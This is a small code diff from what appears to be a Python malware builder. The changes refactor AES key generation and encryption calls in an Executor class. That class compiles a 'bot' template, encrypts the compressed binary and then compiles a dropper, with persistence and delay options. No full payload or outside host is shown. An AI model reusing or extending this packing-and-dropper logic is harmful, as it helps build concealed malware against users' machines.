@@ -11,7 +11,7 @@ import smtplib
 import tempfile
 from lib.file import File
 from lib.args import Args
-from lib.aes import gen_key, encrypt
+from lib.aes import CryptoAES
 
 try:
     from PyInstaller import __main__ as pyi, is_win
@@ -30,9 +30,9 @@ class Executor(object):
         self.icon = icon
         self.binary = b''
         self.delay = delay
-        self.key = gen_key()
         self.persist = persist
         self.filename = filename
+        self.key = CryptoAES.generate_key()
 
         self.output_dir = 'output'
         self.tmp_dir = tempfile.mkdtemp()
@@ -82,7 +82,7 @@ class Executor(object):
         self.write_template(self.bot_template, self.bot_py_temp, _dict)
         if self.exe:
             with open(self.bot_compiled, 'rb') as f:
-                self.binary = encrypt(zlib.compress(f.read()), self.key)
+                self.binary = CryptoAES.encrypt(zlib.compress(f.read()), self.key)
 
     def compile_dropper(self):
         _dict = {
